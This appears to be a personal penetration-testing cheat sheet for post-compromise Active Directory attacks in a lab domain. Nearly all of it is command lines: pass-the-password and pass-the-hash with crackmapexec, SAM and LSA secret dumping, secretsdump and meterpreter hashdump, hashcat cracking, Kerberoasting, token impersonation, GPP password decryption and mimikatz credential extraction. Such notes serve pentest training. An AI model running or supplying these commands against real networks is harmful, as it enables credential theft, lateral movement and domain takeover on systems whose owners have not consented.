# Attacking Active Directory: Post-Compromise Attacks

## Pass attacks

{% embed url="https://www.linkedin.com/posts/wilfried-p_explication-super-claire-lsa-vs-lsass-vs-activity-7054499362453774336-W_2u" %}

pass password

```
crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
```

Pass the hash

```
crackmapexec smb 10.0.0.0/24 -u administrator -H [USER-HASH] # in this case we spay 
```

Reminder! Cheatsheet of crackmapexec

\--local-auth : authenticate locally to each target

\--sam : dump SAM hashes from target systems.

\--lsa : dump LSA secrets from target systems.

\--shares: enumerate shares and access

-L : List available modules for each protocol

-M : Specify module

Usage of module&#x20;

```
crackmapexec smb 192.168.138.0/24 -u administrator -H [USER-HASH] --local-auth -M lsassy
```

cmedb the crackmapexec database



## Dumping and cracking hashes

meterpreter hashdump

```
use windows/smb/psexec
run
hasdump #you will get hashes of users.
```

secretdump

```
# method 1
secretsdump.py MARVEL.local/fcastle:Password1@10.0.0.25
# method 2
secretsdump.py administrator:@192.168.138.138 --hashes [LM-HASH]:[NT-HASH]
```

crack

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

## Kerberoasting



```
python GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip [DC_IP] -request

hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

## Token impersonation

use metasploit

```
# use psexec of metasploit and set meterpreter payload
load incognito
load kiwi
list_tokens -u
impersonate_token MARVEL\\administrator # the DC must have been rebooted and admin must have logged in


```

Use rev2self to be again authority\_system



## GPP attack



```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeX0sQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Or use msf smv\_enum\_gpp if you have user creds&#x20;



## mimikatz

```
mimikatz # privilege::debug

mimikatz # sekurlsa::logonPasswords

```
